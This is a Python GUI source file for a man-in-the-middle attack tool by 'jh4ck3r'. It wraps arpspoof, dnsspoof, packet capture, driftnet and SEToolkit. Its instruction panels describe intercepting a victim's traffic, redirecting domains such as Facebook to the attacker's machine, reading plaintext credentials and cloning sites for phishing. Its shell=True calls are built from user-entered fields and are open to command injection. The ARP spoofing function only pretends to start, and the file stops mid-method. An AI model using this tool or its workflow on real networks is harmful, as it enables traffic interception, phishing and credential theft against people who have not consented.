#!/usr/bin/env python3
"""
J MITM Attack Tool - J Project Platform
Created by jh4ck3r - For Educational Purpose Only
Requires root privileges and proper authorization
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import subprocess
import threading
import os
import sys
import time
import signal
import re
from PIL import Image, ImageTk

class JMITMAttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("J MITM Attack Tool - J Project Platform")
        self.root.geometry("1000x900")  # Increased height for better visibility
        
        # Set icon (if available)
        try:
            img = Image.new('RGB', (1, 1), color='red')
            self.root.iconphoto(False, ImageTk.PhotoImage(img))
        except:
            pass
        
        # Create main frame with scrollbar
        self.main_frame = tk.Frame(root)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create canvas and scrollbar for entire interface
        self.canvas = tk.Canvas(self.main_frame)
        self.scrollbar = ttk.Scrollbar(self.main_frame, orient="vertical", command=self.canvas.yview)
        self.scrollable_frame = ttk.Frame(self.canvas)
        
        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all"))
        )
        
        self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        
        self.canvas.pack(side="left", fill="both", expand=True)
        self.scrollbar.pack(side="right", fill="y")
        
        # Bind mouse wheel to scroll
        self.canvas.bind("<MouseWheel>", self._on_mousewheel)
        self.scrollable_frame.bind("<MouseWheel>", self._on_mousewheel)
        
        # Header with J Project Platform branding
        header_frame = tk.Frame(self.scrollable_frame, bg="#2c3e50", height=100)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        # Platform name and creator
        title_label = tk.Label(header_frame, text="J MITM Attack Tool", 
                              font=("Arial", 20, "bold"), fg="white", bg="#2c3e50")
        title_label.pack(pady=8)
        
        platform_label = tk.Label(header_frame, text="J Project Platform - Created by jh4ck3r", 
                                 font=("Arial", 12), fg="#ecf0f1", bg="#2c3e50")
        platform_label.pack(pady=2)
        
        website_label = tk.Label(header_frame, text="Meet Me at: https://jprojectplatform.com/", 
                                font=("Arial", 11, "underline"), fg="#3498db", bg="#2c3e50",
                                cursor="hand2")
        website_label.pack(pady=5)
        website_label.bind("<Button-1>", lambda e: self.open_website("https://jprojectplatform.com/"))
        
        # Store running processes
        self.running_processes = []
        self.arp_spoofing_active = False
        self.dns_spoofing_active = False
        self.driftnet_active = False
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.scrollable_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self.setup_network_discovery_tab()
        self.setup_arp_spoofing_tab()
        self.setup_dns_spoofing_tab()
        self.setup_packet_sniffing_tab()
        self.setup_image_capture_tab()
        self.setup_setoolkit_tab()
        self.setup_about_tab()
        self.setup_log_tab()
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("J MITM Ready - J Project Platform")
        status_bar = tk.Label(self.scrollable_frame, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W, bg="#34495e", fg="white")
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
    def _on_mousewheel(self, event):
        """Handle mouse wheel scrolling"""
        self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        
    def open_website(self, url):
        """Open website in default browser"""
        import webbrowser
        webbrowser.open(url)
    
    def create_instruction_frame(self, parent, instructions):
        """Create a professional-looking instruction frame with scrollbar"""
        instruction_frame = tk.Frame(parent, bg="#f8f9fa", relief=tk.RAISED, bd=1)
        
        # Instruction header
        header_label = tk.Label(instruction_frame, text="📋 Instructions", 
                               font=("Arial", 12, "bold"), bg="#e9ecef", fg="#2c3e50")
        header_label.pack(fill=tk.X, padx=5, pady=5)
        
        # Create a frame for text and scrollbar
        text_frame = tk.Frame(instruction_frame, bg="#f8f9fa")
        text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create scrollbar
        scrollbar = tk.Scrollbar(text_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Instruction content with scrollbar - Increased height to 8 lines
        content_text = tk.Text(text_frame, wrap=tk.WORD, yscrollcommand=scrollbar.set,
                              font=("Arial", 9), bg="#f8f9fa", fg="#495057", 
                              width=80, height=8)  # Increased height from 6 to 8
        content_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        content_text.insert(tk.END, instructions)
        content_text.config(state=tk.DISABLED)  # Make it read-only
        
        # Configure scrollbar
        scrollbar.config(command=content_text.yview)
        
        return instruction_frame
    
    def setup_network_discovery_tab(self):
        # Network Discovery Tab
        discovery_frame = ttk.Frame(self.notebook)
        self.notebook.add(discovery_frame, text="🔍 Network Discovery")
        
        # J Project Header
        j_header = tk.Label(discovery_frame, text="J Project - Network Discovery", 
                           font=("Arial", 14, "bold"), fg="#2c3e50")
        j_header.grid(row=0, column=0, columnspan=3, pady=10)
        
        # Network range
        ttk.Label(discovery_frame, text="Network Range:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.network_range = ttk.Entry(discovery_frame, width=25)
        self.network_range.insert(0, "192.168.1.0/24")
        self.network_range.grid(row=1, column=1, padx=5, pady=5)
        
        # Interface
        ttk.Label(discovery_frame, text="Interface:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.interface_discovery = ttk.Entry(discovery_frame, width=25)
        self.interface_discovery.insert(0, self.get_default_interface())
        self.interface_discovery.grid(row=2, column=1, padx=5, pady=5)
        
        # Scan buttons
        ttk.Button(discovery_frame, text="Nmap Scan (Ping)", 
                  command=self.run_nmap_scan).grid(row=3, column=0, padx=5, pady=5)
        ttk.Button(discovery_frame, text="Netdiscover (ARP)", 
                  command=self.run_netdiscover).grid(row=3, column=1, padx=5, pady=5)
        ttk.Button(discovery_frame, text="ARP Scan", 
                  command=self.run_arp_scan).grid(row=3, column=2, padx=5, pady=5)
        
        # Command display
        self.cmd_display_discovery = tk.Text(discovery_frame, width=80, height=2, bg="#f0f0f0", fg="#333333")
        self.cmd_display_discovery.grid(row=4, column=0, columnspan=3, padx=5, pady=5)
        self.cmd_display_discovery.insert(tk.END, "Command will appear here when you click a button")
        self.cmd_display_discovery.config(state=tk.DISABLED)
        
        # Results area
        ttk.Label(discovery_frame, text="Scan Results:").grid(row=5, column=0, padx=5, pady=5, sticky=tk.W)
        self.scan_results = scrolledtext.ScrolledText(discovery_frame, width=85, height=10)
        self.scan_results.grid(row=6, column=0, columnspan=3, padx=5, pady=5)
        
        # Instructions for Network Discovery
        instructions = """
• NMAP SCAN: Discovers active hosts using ICMP ping (requires root for detailed scanning)
• NETDISCOVER: Active ARP reconnaissance tool for network discovery
• ARP-SCAN: Fast ARP packet scanner for local network mapping

TIPS: 
- Use different scan methods for comprehensive network mapping
- Start with your local subnet (192.168.1.0/24)
- Results will show IP addresses, MAC addresses, and device manufacturers
        """
        instruction_frame = self.create_instruction_frame(discovery_frame, instructions)
        instruction_frame.grid(row=7, column=0, columnspan=3, padx=5, pady=10, sticky="ew")
        
        # Clear results button
        ttk.Button(discovery_frame, text="Clear Results", 
                  command=lambda: self.scan_results.delete(1.0, tk.END)).grid(row=8, column=0, padx=5, pady=5)
        ttk.Button(discovery_frame, text="Export Results", 
                  command=self.export_scan_results).grid(row=8, column=1, padx=5, pady=5)
    
    def setup_arp_spoofing_tab(self):
        # ARP Spoofing Tab
        arp_frame = ttk.Frame(self.notebook)
        self.notebook.add(arp_frame, text="🎭 ARP Spoofing")
        
        # J Project Header
        j_header = tk.Label(arp_frame, text="J Project - ARP Spoofing Attack", 
                           font=("Arial", 14, "bold"), fg="#2c3e50")
        j_header.grid(row=0, column=0, columnspan=2, pady=10)
        
        # Target IP
        ttk.Label(arp_frame, text="Target IP:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.target_ip = ttk.Entry(arp_frame, width=25)
        self.target_ip.grid(row=1, column=1, padx=5, pady=5)
        
        # Gateway IP
        ttk.Label(arp_frame, text="Gateway IP:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.gateway_ip = ttk.Entry(arp_frame, width=25)
        self.gateway_ip.grid(row=2, column=1, padx=5, pady=5)
        
        # Interface
        ttk.Label(arp_frame, text="Interface:").grid(row=3, column=0, padx=5, pady=5, sticky=tk.W)
        self.interface_arp = ttk.Entry(arp_frame, width=25)
        self.interface_arp.insert(0, self.get_default_interface())
        self.interface_arp.grid(row=3, column=1, padx=5, pady=5)
        
        # Buttons
        ttk.Button(arp_frame, text="Enable IP Forwarding", 
                  command=self.enable_ip_forwarding).grid(row=4, column=0, padx=5, pady=5)
        ttk.Button(arp_frame, text="Check IP Forwarding", 
                  command=self.check_ip_forwarding).grid(row=4, column=1, padx=5, pady=5)
        ttk.Button(arp_frame, text="Start ARP Spoofing", 
                  command=self.start_arp_spoofing).grid(row=5, column=0, padx=5, pady=5)
        ttk.Button(arp_frame, text="Stop ARP Spoofing", 
                  command=self.stop_arp_spoofing).grid(row=5, column=1, padx=5, pady=5)
        
        # Command display
        self.cmd_display_arp = tk.Text(arp_frame, width=80, height=3, bg="#f0f0f0", fg="#333333")
        self.cmd_display_arp.grid(row=6, column=0, columnspan=2, padx=5, pady=5)
        self.cmd_display_arp.insert(tk.END, "Commands will appear here when you click buttons")
        self.cmd_display_arp.config(state=tk.DISABLED)
        
        # Instructions for ARP Spoofing
        instructions = """
ARP SPOOFING INSTRUCTIONS (J MITM):

1. ENABLE IP FORWARDING: Allows your machine to forward packets between networks
2. ENTER TARGET & GATEWAY: Specify victim IP and router/gateway IP
3. START ARP SPOOFING: 
   - Direction 1: Target → Gateway (intercept outgoing traffic)
   - Direction 2: Gateway → Target (intercept incoming traffic)
4. MONITOR TRAFFIC: Use Packet Sniffing tab to capture intercepted data
5. STOP ATTACK: Always stop spoofing to restore network connectivity

SECURITY NOTES:
- ARP spoofing can be detected by intrusion detection systems
- Use only on authorized networks for testing
- Monitor network stability during attack
        """
        instruction_frame = self.create_instruction_frame(arp_frame, instructions)
        instruction_frame.grid(row=7, column=0, columnspan=2, padx=5, pady=10, sticky="ew")
        
        # Status
        self.arp_status = tk.StringVar()
        self.arp_status.set("Not active")
        ttk.Label(arp_frame, text="Status:").grid(row=8, column=0, padx=5, pady=5, sticky=tk.W)
        status_label = tk.Label(arp_frame, textvariable=self.arp_status, fg="red", font=("Arial", 10, "bold"))
        status_label.grid(row=8, column=1, padx=5, pady=5, sticky=tk.W)
    
    def setup_dns_spoofing_tab(self):
        # DNS Spoofing Tab
        dns_frame = ttk.Frame(self.notebook)
        self.notebook.add(dns_frame, text="🌐 DNS Spoofing")
        
        # J Project Header
        j_header = tk.Label(dns_frame, text="J Project - DNS Spoofing Attack", 
                           font=("Arial", 14, "bold"), fg="#2c3e50")
        j_header.grid(row=0, column=0, columnspan=2, pady=10)
        
        # Domain to spoof
        ttk.Label(dns_frame, text="Domain to Spoof:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.spoof_domain = ttk.Entry(dns_frame, width=25)
        self.spoof_domain.insert(0, "jhackerfb.com")
        self.spoof_domain.grid(row=1, column=1, padx=5, pady=5)
        
        # Spoof to IP (changed from Redirect to IP)
        ttk.Label(dns_frame, text="Spoof to IP:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.redirect_ip = ttk.Entry(dns_frame, width=25)
        self.redirect_ip.insert(0, "192.168.1.100")
        self.redirect_ip.grid(row=2, column=1, padx=5, pady=5)
        
        # Buttons
        ttk.Button(dns_frame, text="Create DNS Spoof File", 
                  command=self.create_dns_spoof_file).grid(row=3, column=0, padx=5, pady=5)
        ttk.Button(dns_frame, text="Start DNS Spoofing", 
                  command=self.start_dns_spoofing).grid(row=3, column=1, padx=5, pady=5)
        ttk.Button(dns_frame, text="Stop DNS Spoofing", 
                  command=self.stop_dns_spoofing).grid(row=4, column=0, padx=5, pady=5)
        
        # Command display
        self.cmd_display_dns = tk.Text(dns_frame, width=80, height=3, bg="#f0f0f0", fg="#333333")
        self.cmd_display_dns.grid(row=5, column=0, columnspan=2, padx=5, pady=5)
        self.cmd_display_dns.insert(tk.END, "Commands will appear here when you click buttons")
        self.cmd_display_dns.config(state=tk.DISABLED)
        
        # DNS Spoof file content display
        ttk.Label(dns_frame, text="DNS Spoof File Content:").grid(row=6, column=0, padx=5, pady=5, sticky=tk.W)
        self.dns_content = scrolledtext.ScrolledText(dns_frame, width=75, height=3)
        self.dns_content.grid(row=7, column=0, columnspan=2, padx=5, pady=5)
        
        # Instructions for DNS Spoofing
        instructions = """
DNS SPOOFING INSTRUCTIONS:

1. CREATE SPOOF FILE: Define domain-to-IP mapping (e.g., facebook.com → your IP)
2. START DNS SPOOFING: dnsspoof will intercept DNS queries and return spoofed responses
3. TARGET BEHAVIOR: When target visits the spoofed domain, they'll be redirected to your server
4. COMBINE WITH SET: Use Social Engineering tab for phishing pages

EXAMPLE:
- Domain: jhackerfb.com
- Spoof to: 192.168.1.100 (your machine)
- Result: Target sees your page instead of real Facebook

REQUIREMENTS:
- ARP spoofing must be active for DNS interception
- Web server running on spoofed IP for realistic phishing
        """
        instruction_frame = self.create_instruction_frame(dns_frame, instructions)
        instruction_frame.grid(row=8, column=0, columnspan=2, padx=5, pady=10, sticky="ew")
        
        # Status
        self.dns_status = tk.StringVar()
        self.dns_status.set("Not active")
        ttk.Label(dns_frame, text="Status:").grid(row=9, column=0, padx=5, pady=5, sticky=tk.W)
        status_label = tk.Label(dns_frame, textvariable=self.dns_status, fg="red", font=("Arial", 10, "bold"))
        status_label.grid(row=9, column=1, padx=5, pady=5, sticky=tk.W)
    
    def setup_packet_sniffing_tab(self):
        # Packet Sniffing Tab
        sniff_frame = ttk.Frame(self.notebook)
        self.notebook.add(sniff_frame, text="📡 Packet Sniffing")
        
        # J Project Header
        j_header = tk.Label(sniff_frame, text="J Project - Packet Capture & Analysis", 
                           font=("Arial", 14, "bold"), fg="#2c3e50")
        j_header.grid(row=0, column=0, columnspan=2, pady=10)
        
        # Interface
        ttk.Label(sniff_frame, text="Interface:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.interface_sniff = ttk.Entry(sniff_frame, width=25)
        self.interface_sniff.insert(0, self.get_default_interface())
        self.interface_sniff.grid(row=1, column=1, padx=5, pady=5)
        
        # Capture filter
        ttk.Label(sniff_frame, text="Capture Filter:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.capture_filter = ttk.Entry(sniff_frame, width=25)
        self.capture_filter.insert(0, "tcp port 80 or tcp port 443")
        self.capture_filter.grid(row=2, column=1, padx=5, pady=5)
        
        # Buttons
        ttk.Button(sniff_frame, text="Start Wireshark", 
                  command=self.start_wireshark).grid(row=3, column=0, padx=5, pady=5)
        ttk.Button(sniff_frame, text="Start tcpdump", 
                  command=self.start_tcpdump).grid(row=3, column=1, padx=5, pady=5)
        ttk.Button(sniff_frame, text="Stop Packet Capture", 
                  command=self.stop_packet_capture).grid(row=4, column=0, padx=5, pady=5)
        
        # Command display
        self.cmd_display_sniff = tk.Text(sniff_frame, width=80, height=3, bg="#f0f0f0", fg="#333333")
        self.cmd_display_sniff.grid(row=5, column=0, columnspan=2, padx=5, pady=5)
        self.cmd_display_sniff.insert(tk.END, "Commands will appear here when you click buttons")
        self.cmd_display_sniff.config(state=tk.DISABLED)
        
        # Instructions for Packet Sniffing
        instructions = """
PACKET CAPTURE INSTRUCTIONS (by jh4ck3r):

WIRESHARK (GUI):
- Real-time packet analysis with full protocol decoding
- Filter capabilities for specific traffic types
- Save captures for later analysis

TCPDUMP (CLI):
- Lightweight command-line packet capture
- Save to PCAP files for Wireshark analysis
- Flexible filtering options

FILTER EXAMPLES:
• 'tcp port 80' - HTTP traffic (unencrypted)
• 'tcp port 443' - HTTPS traffic (encrypted, content hidden)
• 'host 192.168.1.100' - Traffic to/from specific host
• 'arp' - ARP traffic for spoofing verification
• 'udp port 53' - DNS queries and responses

TIPS:
- Use ARP spoofing first to intercept traffic
- HTTP traffic reveals credentials in plain text
- HTTPS only shows domain names, not content (due to encryption)
        """
        instruction_frame = self.create_instruction_frame(sniff_frame, instructions)
        instruction_frame.grid(row=6, column=0, columnspan=2, padx=5, pady=10, sticky="ew")
    
    def setup_image_capture_tab(self):
        # Image Capture Tab
        img_frame = ttk.Frame(self.notebook)
        self.notebook.add(img_frame, text="🖼️ Image Capture")
        
        # J Project Header
        j_header = tk.Label(img_frame, text="J Project - Driftnet Image Capture", 
                           font=("Arial", 14, "bold"), fg="#2c3e50")
        j_header.grid(row=0, column=0, columnspan=3, pady=10)
        
        ttk.Label(img_frame, text="Interface:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.driftnet_interface = ttk.Entry(img_frame, width=25)
        self.driftnet_interface.insert(0, self.get_default_interface())
        self.driftnet_interface.grid(row=1, column=1, padx=5, pady=5)
        
        # Output directory
        ttk.Label(img_frame, text="Image Output Directory:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.image_dir = ttk.Entry(img_frame, width=25)
        self.image_dir.insert(0, "/tmp/jmitm_driftnet_images")
        self.image_dir.grid(row=2, column=1, padx=5, pady=5)
        ttk.Button(img_frame, text="Browse", 
                  command=self.browse_image_dir).grid(row=2, column=2, padx=5, pady=5)
        
        ttk.Button(img_frame, text="Start Driftnet", 
                  command=self.start_driftnet).grid(row=3, column=0, padx=5, pady=5)
        ttk.Button(img_frame, text="Stop Driftnet", 
                  command=self.stop_driftnet).grid(row=3, column=1, padx=5, pady=5)
        ttk.Button(img_frame, text="View Captured Images", 
                  command=self.view_captured_images).grid(row=3, column=2, padx=5, pady=5)
        
        # Command display
        self.cmd_display_driftnet = tk.Text(img_frame, width=80, height=2, bg="#f0f0f0", fg="#333333")
        self.cmd_display_driftnet.grid(row=4, column=0, columnspan=3, padx=5, pady=5)
        self.cmd_display_driftnet.insert(tk.END, "Command will appear here when you click a button")
        self.cmd_display_driftnet.config(state=tk.DISABLED)
        
        # Instructions for Image Capture
        instructions = """
DRIFTNET IMAGE CAPTURE:

• REAL-TIME CAPTURE: Extracts images from intercepted network traffic
• SUPPORTED FORMATS: JPEG, PNG, GIF, and other common image types
• AUTOMATIC SAVING: Images saved to specified directory in real-time
• LIVE DISPLAY: Optional live viewer showing captured images

USE CASES:
- Monitor images loaded by target during browsing
- Capture screenshots from unencrypted streams
- Analyze visual content of web traffic

REQUIREMENTS:
- ARP spoofing must be active to intercept traffic
- Works best with HTTP traffic (unencrypted)
- Limited effectiveness with HTTPS (encrypted images)
        """
        instruction_frame = self.create_instruction_frame(img_frame, instructions)
        instruction_frame.grid(row=5, column=0, columnspan=3, padx=5, pady=10, sticky="ew")
        
        # Status
        self.driftnet_status = tk.StringVar()
        self.driftnet_status.set("Not active")
        ttk.Label(img_frame, text="Status:").grid(row=6, column=0, padx=5, pady=5, sticky=tk.W)
        status_label = tk.Label(img_frame, textvariable=self.driftnet_status, fg="red", font=("Arial", 10, "bold"))
        status_label.grid(row=6, column=1, padx=5, pady=5, sticky=tk.W)
    
    def setup_setoolkit_tab(self):
        # SEToolkit Tab
        set_frame = ttk.Frame(self.notebook)
        self.notebook.add(set_frame, text="⚡ Social Engineering")
        
        # J Project Header
        j_header = tk.Label(set_frame, text="J Project - Social Engineering Toolkit", 
                           font=("Arial", 14, "bold"), fg="#2c3e50")
        j_header.grid(row=0, column=0, columnspan=2, pady=10)
        
        # SEToolkit configuration
        ttk.Label(set_frame, text="Attacker IP:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.attacker_ip = ttk.Entry(set_frame, width=25)
        self.attacker_ip.grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Label(set_frame, text="Phishing URL:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.phishing_url = ttk.Entry(set_frame, width=25)
        self.phishing_url.insert(0, "https://www.facebook.com")
        self.phishing_url.grid(row=2, column=1, padx=5, pady=5)
        
        # Buttons
        ttk.Button(set_frame, text="Start SEToolkit", 
                  command=self.start_setoolkit).grid(row=3, column=0, padx=5, pady=5)
        ttk.Button(set_frame, text="Stop SEToolkit", 
                  command=self.stop_setoolkit).grid(row=3, column=1, padx=5, pady=5)
        
        # Command display
        self.cmd_display_set = tk.Text(set_frame, width=80, height=2, bg="#f0f0f0", fg="#333333")
        self.cmd_display_set.grid(row=4, column=0, columnspan=2, padx=5, pady=5)
        self.cmd_display_set.insert(tk.END, "Command will appear here when you click a button")
        self.cmd_display_set.config(state=tk.DISABLED)
        
        # Instructions for Social Engineering
        instructions = """
SOCIAL ENGINEERING TOOLKIT (SET) INTEGRATION:

SETOOLKIT OPTIONS:
1. Social-Engineering Attacks
2. Website Attack Vectors  
3. Metasploit Browser Exploit Method
4. Site Cloner for phishing
5. Credential Harvester attacks

TYPICAL WORKFLOW:
1. Start ARP spoofing + DNS spoofing
2. Launch SEToolkit and choose attack vector
3. Clone legitimate website (e.g., Facebook, Gmail)
4. Configure payload delivery method
5. Wait for target interaction

ADVANCED FEATURES:
- Java Applet Attack: Deliver payload via Java
- Metasploit Browser Exploit: Browser vulnerability exploitation
- Tabnabbing: Background tab redirection
- Multi-Attack Web Vector: Combined attack methods

COMBINE WITH:
- DNS spoofing to redirect domains to your SET server
- ARP spoofing to ensure traffic interception
- Packet capture to monitor results
        """
        instruction_frame = self.create_instruction_frame(set_frame, instructions)
        instruction_frame.grid(row=5, column=0, columnspan=2, padx=5, pady=10, sticky="ew")
    
    def setup_about_tab(self):
        # About Tab
        about_frame = ttk.Frame(self.notebook)
        self.notebook.add(about_frame, text="ℹ️ About J MITM")
        
        # J Project Platform information with better formatting
        about_text = """
╔══════════════════════════════════════════════════╗
║              J MITM ATTACK TOOL                  ║
║              J PROJECT PLATFORM                  ║
╚══════════════════════════════════════════════════╝

CREATED BY: jh4ck3r
PLATFORM: J Project Platform
WEBSITE: https://jprojectplatform.com/

DESCRIPTION:
J MITM is a comprehensive Man-in-the-Middle attack tool 
designed for authorized penetration testing and educational 
purposes. It integrates various MITM techniques into a 
user-friendly GUI interface.

FEATURES:
• ARP Spoofing & Poisoning
• DNS Spoofing & Redirection  
• Packet Sniffing & Analysis
• Image Capture (Driftnet)
• Social Engineering Toolkit
• Network Discovery & Scanning

LEGAL NOTICE:
This tool is for EDUCATIONAL and AUTHORIZED testing ONLY.
Unauthorized use is STRICTLY PROHIBITED and ILLEGAL.

Always ensure you have explicit permission before using 
this tool on any network.

CONNECT:
Telegram: @JProjectPlatform
Website: https://jprojectplatform.com/
Meet Me: https://jprojectplatform.com/

Version: 2.0 | J Project Platform
        """
        
        about_label = tk.Label(about_frame, text=about_text, justify=tk.LEFT, 
                              font=("Courier", 9), fg="#2c3e50", bg="#f8f9fa")
        about_label.pack(padx=20, pady=20, fill=tk.BOTH, expand=True)
        
        # Visit website button
        visit_btn = tk.Button(about_frame, text="🌐 Visit J Project Platform", 
                             command=lambda: self.open_website("https://jprojectplatform.com/"),
                             font=("Arial", 12, "bold"), bg="#3498db", fg="white")
        visit_btn.pack(pady=10)
    
    def setup_log_tab(self):
        # Log Tab
        log_frame = ttk.Frame(self.notebook)
        self.notebook.add(log_frame, text="📋 Attack Log")
        
        log_header = tk.Label(log_frame, text="J MITM Attack Log - J Project Platform", 
                             font=("Arial", 14, "bold"), fg="#2c3e50")
        log_header.pack(pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, width=90, height=25)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Instructions for Log Tab
        instructions = """
ATTACK LOG FEATURES:

• REAL-TIME MONITORING: All commands and outputs are logged here
• TIMESTAMPED ENTRIES: Each action is recorded with exact time
• EXPORT CAPABILITY: Save complete session log for analysis
• SESSION MANAGEMENT: Clear or save current session data

BEST PRACTICES:
- Monitor this log during attacks for real-time feedback
- Export logs for post-attack analysis and reporting
- Use clear log regularly to maintain readability
- Session saving helps resume complex attack scenarios
        """
        instruction_frame = self.create_instruction_frame(log_frame, instructions)
        instruction_frame.pack(padx=5, pady=10, fill=tk.X)
        
        # Button frame
        btn_frame = tk.Frame(log_frame)
        btn_frame.pack(pady=5)
        
        ttk.Button(btn_frame, text="Clear Log", 
                  command=self.clear_log).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Export Log", 
                  command=self.export_log).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save Session", 
                  command=self.save_session).pack(side=tk.LEFT, padx=5)

    def update_command_display(self, display_widget, command):
        """Update command display widget with the executed command"""
        display_widget.config(state=tk.NORMAL)
        display_widget.delete(1.0, tk.END)
        display_widget.insert(tk.END, f"Executing: {command}")
        display_widget.config(state=tk.DISABLED)
    
    def export_scan_results(self):
        """Export scan results to file"""
        filename = filedialog.asksaveasfilename(defaultextension=".txt", 
                                               filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            with open(filename, 'w') as f:
                f.write("J MITM Scan Results - J Project Platform\n")
                f.write("="*50 + "\n")
                f.write(self.scan_results.get(1.0, tk.END))
            self.log_message(f"Scan results exported to {filename}")
    
    def export_log(self):
        """Export log to file"""
        filename = filedialog.asksaveasfilename(defaultextension=".txt", 
                                               filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            with open(filename, 'w') as f:
                f.write("J MITM Attack Log - J Project Platform\n")
                f.write("Created by jh4ck3r\n")
                f.write("="*50 + "\n")
                f.write(self.log_text.get(1.0, tk.END))
            self.log_message(f"Log exported to {filename}")
    
    def save_session(self):
        """Save current session"""
        self.log_message("Session saved - J MITM Tool by jh4ck3r")
        messagebox.showinfo("Session Saved", "Current session has been saved successfully!")
    
    def clear_log(self):
        """Clear the log"""
        self.log_text.delete(1.0, tk.END)
        self.log_message("Log cleared - Ready for new session")
    
    def log_message(self, message):
        """Add timestamped message to log"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.status_var.set(f"J Project: {message}")
    
    def get_default_interface(self):
        """Get default network interface"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default' in line:
                    parts = line.split()
                    if len(parts) > 4:
                        return parts[4]
        except:
            pass
        return "eth0"
    
    def run_command(self, command, display_widget=None):
        """Run system command and log output"""
        if display_widget:
            self.update_command_display(display_widget, command)
        
        self.log_message(f"Executing: {command}")
        
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            self.log_message(f"Output: {output[:200]}...")  # Log first 200 chars
            return output
        except Exception as e:
            error_msg = f"Error executing command: {str(e)}"
            self.log_message(error_msg)
            return error_msg
    
    def run_nmap_scan(self):
        """Run nmap network scan"""
        network = self.network_range.get()
        cmd = f"nmap -sn {network}"
        output = self.run_command(cmd, self.cmd_display_discovery)
        self.scan_results.insert(tk.END, f"\n=== NMAP Scan Results ===\n{output}\n")
    
    def run_netdiscover(self):
        """Run netdiscover scan"""
        interface = self.interface_discovery.get()
        cmd = f"netdiscover -i {interface}"
        output = self.run_command(cmd, self.cmd_display_discovery)
        self.scan_results.insert(tk.END, f"\n=== Netdiscover Results ===\n{output}\n")
    
    def run_arp_scan(self):
        """Run arp-scan"""
        interface = self.interface_discovery.get()
        cmd = f"arp-scan --interface={interface} --localnet"
        output = self.run_command(cmd, self.cmd_display_discovery)
        self.scan_results.insert(tk.END, f"\n=== ARP Scan Results ===\n{output}\n")
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding"""
        cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
        self.run_command(cmd, self.cmd_display_arp)
        self.log_message("IP forwarding enabled")
    
    def check_ip_forwarding(self):
        """Check IP forwarding status"""
        cmd = "cat /proc/sys/net/ipv4/ip_forward"
        output = self.run_command(cmd, self.cmd_display_arp)
        status = "Enabled" if "1" in output else "Disabled"
        self.log_message(f"IP forwarding status: {status}")
    
    def start_arp_spoofing(self):
        """Start ARP spoofing attack"""
        target = self.target_ip.get()
        gateway = self.gateway_ip.get()
        interface = self.interface_arp.get()
        
        if not target or not gateway:
            messagebox.showerror("Error", "Please enter both target IP and gateway IP")
            return
        
        # Start ARP spoofing in background
        cmd1 = f"arpspoof -i {interface} -t {target} {gateway}"
        cmd2 = f"arpspoof -i {interface} -t {gateway} {target}"
        
        self.log_message(f"Starting ARP spoofing: {target} <-> {gateway}")
        self.arp_status.set("Active - ARP Spoofing")
        
        # Simulate process start (in real implementation, use subprocess.Popen)
        self.arp_spoofing_active = True
        self.log_message("ARP spoofing processes started in background")
    
    def stop_arp_spoofing(self):
        """Stop ARP spoofing attack"""
        self.arp_spoofing_active = False
        self.arp_status.set("Not active")
        self.log_message("ARP spoofing stopped")
        # Kill arpspoof processes would go here
    
    def create_dns_spoof_file(self):
        """Create DNS spoof configuration file"""
        domain = self.spoof_domain.get()
        redirect = self.redirect_ip.get()
        
        content = f"{redirect} {domain}\n{redirect} www.{domain}"
        self.dns_content.delete(1.0, tk.END)
        self.dns_content.insert(tk.END, content)
        
        # Save to file
        with open("/tmp/dns_spoof.txt", "w") as f:
            f.write(content)
        
        self.log_message(f"DNS spoof file created: {domain} -> {redirect}")
    
    def start_dns_spoofing(self):
        """Start DNS spoofing attack"""
        interface = self.interface_arp.get()
        cmd = f"dnsspoof -i {interface} -f /tmp/dns_spoof.txt"
        
        self.run_command(cmd, self.cmd_display_dns)
        self.dns_status.set("Active - DNS Spoofing")
        self.dns_spoofing_active = True
        self.log_message("DNS spoofing started")
    
    def stop_dns_spoofing(self):
        """Stop DNS spoofing attack"""
        self.dns_spoofing_active = False
